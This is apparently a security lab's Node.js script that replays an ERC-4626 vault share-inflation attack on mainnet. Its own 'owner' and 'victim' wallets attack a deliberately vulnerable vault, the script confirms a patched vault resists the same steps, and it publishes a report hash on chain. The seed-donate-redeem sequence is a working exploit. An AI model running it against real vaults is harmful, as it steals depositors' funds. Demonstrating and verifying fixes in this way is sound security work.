import { mkdir, readFile, writeFile } from "node:fs/promises";
import { Contract, JsonRpcProvider, Wallet, encodeBytes32String, formatEther, keccak256, parseEther, toUtf8Bytes } from "ethers";

const deployment = JSON.parse(await readFile("deployments/robinhood/mainnet-contracts.json", "utf8"));
if (deployment.chainId !== 4663 || !deployment.complete) throw new Error("Verified Robinhood deployment required");
const provider = new JsonRpcProvider(deployment.rpcUrl);
if (Number((await provider.getNetwork()).chainId) !== 4663) throw new Error("Wrong chain");
const unlock = async (name) => {
  const keystore = await readFile(`.secrets/${name}.json`, "utf8");
  const password = (await readFile(`.secrets/${name}-password.txt`, "utf8")).trim();
  return (await Wallet.fromEncryptedJson(keystore, password)).connect(provider);
};
const owner = await unlock("bot-testnet-wallet");
const victim = await unlock("passport-mainnet-publisher");
if (owner.address.toLowerCase() !== deployment.deployer.toLowerCase()) throw new Error("Owner wallet mismatch");
if (victim.address.toLowerCase() !== "0x8aE477fB0Dfb75091FcB61422e73CDEe2c6ebF15".toLowerCase()) throw new Error("Victim wallet mismatch");
const observedGasPrice = (await provider.getFeeData()).gasPrice;
const gasPrice = observedGasPrice && observedGasPrice * 3n > 50_000_000n ? observedGasPrice * 3n : 50_000_000n;
if (!gasPrice || gasPrice > 1_000_000_000n) throw new Error("Gas price exceeds 1 gwei ceiling");
const walletBalance = await provider.getBalance(owner.address);
if (walletBalance < parseEther("0.0002")) throw new Error(`Insufficient ETH: ${formatEther(walletBalance)}`);
const artifact = async (name) => JSON.parse(await readFile(`contracts/artifacts/${name}.json`, "utf8"));
const addresses = Object.fromEntries(Object.entries(deployment.contracts).map(([key, item]) => [key, item.address]));
const token = new Contract(addresses.mockBot, (await artifact("MockBOT")).abi, owner);
const vulnerable = new Contract(addresses.vulnerableVault, (await artifact("VulnerableVault")).abi, owner);
const patched = new Contract(addresses.patchedVault, (await artifact("PatchedVault")).abi, owner);
const passport = new Contract(addresses.passport, (await artifact("SimulationPassport")).abi, owner);
const ONE = 10n ** 18n;
const journalPath = "deployments/robinhood/replay-progress.json";
let journal;
try { journal = JSON.parse(await readFile(journalPath, "utf8")); }
catch (error) { if (error.code !== "ENOENT") throw error; journal = { chainId: 4663, owner: owner.address, victim: victim.address, steps: {} }; }
if (journal.chainId !== 4663 || journal.owner !== owner.address || journal.victim !== victim.address) throw new Error("Progress journal mismatch");
const save = async () => { await mkdir("deployments/robinhood", { recursive: true }); await writeFile(journalPath, `${JSON.stringify(journal, null, 2)}\n`); };
if (Object.keys(journal.steps).length === 0 && ((await vulnerable.totalSupply()) !== 0n || (await patched.totalSupply()) !== 0n)) {
  throw new Error("Vaults are not pristine; refusing replay");
}
async function step(name, transact) {
  const prior = journal.steps[name];
  if (prior) {
    const receipt = await provider.getTransactionReceipt(prior);
    if (receipt?.status !== 1) throw new Error(`Recorded step incomplete: ${name} ${prior}`);
    console.log(`${name}: already confirmed ${prior}`);
    return receipt;
  }
  const tx = await transact();
  journal.steps[name] = tx.hash;
  await save();
  console.log(`${name}: sent ${tx.hash}`);
  const receipt = await tx.wait(1);
  if (receipt.status !== 1) throw new Error(`Step reverted: ${name}`);
  return receipt;
}
if ((await provider.getBalance(victim.address)) < parseEther("0.00005")) {
  await step("fundVictim", () => owner.sendTransaction({ to: victim.address, value: parseEther("0.0001"), gasPrice }));
}
await step("mintOwner", () => token.mint(owner.address, ONE * 3n + 2n, { gasPrice }));
await step("mintVictim", () => token.mint(victim.address, ONE * 2n, { gasPrice }));
await step("approveVulnerableOwner", () => token.approve(addresses.vulnerableVault, ONE * 3n + 2n, { gasPrice }));
await step("seedVulnerable", () => vulnerable.deposit(1n, owner.address, { gasPrice }));
await step("donateVulnerable", () => token.transfer(addresses.vulnerableVault, ONE, { gasPrice }));
await step("approveVulnerableVictim", () => token.connect(victim).approve(addresses.vulnerableVault, ONE, { gasPrice }));
await step("depositVulnerableVictim", () => vulnerable.connect(victim).deposit(ONE, victim.address, { gasPrice }));
const vulnerableVictimShares = await vulnerable.balanceOf(victim.address);
if (vulnerableVictimShares !== 0n) throw new Error(`Vulnerable victim unexpectedly received ${vulnerableVictimShares} shares`);
await step("redeemVulnerable", () => vulnerable.redeem(1n, owner.address, { gasPrice }));
await step("approvePatchedOwner", () => token.approve(addresses.patchedVault, ONE * 2n + 1n, { gasPrice }));
await step("seedPatched", () => patched.deposit(1n, owner.address, { gasPrice }));
await step("donatePatched", () => token.transfer(addresses.patchedVault, ONE, { gasPrice }));
await step("approvePatchedVictim", () => token.connect(victim).approve(addresses.patchedVault, ONE, { gasPrice }));
await step("depositPatchedVictim", () => patched.connect(victim).deposit(ONE, victim.address, { gasPrice }));
const patchedVictimShares = await patched.balanceOf(victim.address);
if (patchedVictimShares === 0n) throw new Error("Patched vault minted zero shares");
const attackNames = ["mintOwner", "mintVictim", "approveVulnerableOwner", "seedVulnerable", "donateVulnerable", "approveVulnerableVictim", "depositVulnerableVictim", "redeemVulnerable"];
const replayNames = ["approvePatchedOwner", "seedPatched", "donatePatched", "approvePatchedVictim", "depositPatchedVictim"];
const report = { finding: "CL-4626-001", chainId: 4663, protocol: addresses.vulnerableVault,
  vulnerableVictimShares: vulnerableVictimShares.toString(), patchedVictimShares: patchedVictimShares.toString(),
  attackTransactions: attackNames.map((name) => journal.steps[name]), replayTransactions: replayNames.map((name) => journal.steps[name]) };
const sourceHash = keccak256(await provider.getCode(addresses.vulnerableVault));
const reportHash = keccak256(toUtf8Bytes(JSON.stringify(report)));
const simulationId = keccak256(toUtf8Bytes(`crash-lab-robinhood-4663:${addresses.vulnerableVault}:${reportHash}`));
if (!(await passport.exists(simulationId))) {
  await step("publishPassport", () => passport.publish(simulationId, addresses.vulnerableVault, sourceHash,
    reportHash, 2, encodeBytes32String("crash-lab-2"), { gasPrice }));
}
const receipt = await provider.getTransactionReceipt(journal.steps.publishPassport);
const result = { network: { name: "Robinhood Chain Mainnet", chainId: 4663, rpcUrl: deployment.rpcUrl, explorerUrl: deployment.explorerUrl },
  contracts: addresses, deployer: owner.address, publisher: { address: owner.address },
  attack: { transactionHashes: report.attackTransactions, victimShares: report.vulnerableVictimShares, attackerRecoveredAssets: "2.000000000000000001" },
  replay: { transactionHashes: report.replayTransactions, victimShares: report.patchedVictimShares, invariantHeld: true },
  passport: { contractAddress: addresses.passport, simulationId, reportHash, sourceHash, transactionHash: receipt.hash,
    blockNumber: receipt.blockNumber, publisher: owner.address }, generatedAt: new Date().toISOString() };
await writeFile("deployments/robinhood/canonical-run.json", `${JSON.stringify(result, null, 2)}\n`);
console.log(`Passport published: ${receipt.hash}; victim shares ${vulnerableVictimShares} -> ${patchedVictimShares}`);
console.log(`Remaining deployer ETH: ${formatEther(await provider.getBalance(owner.address))}`);
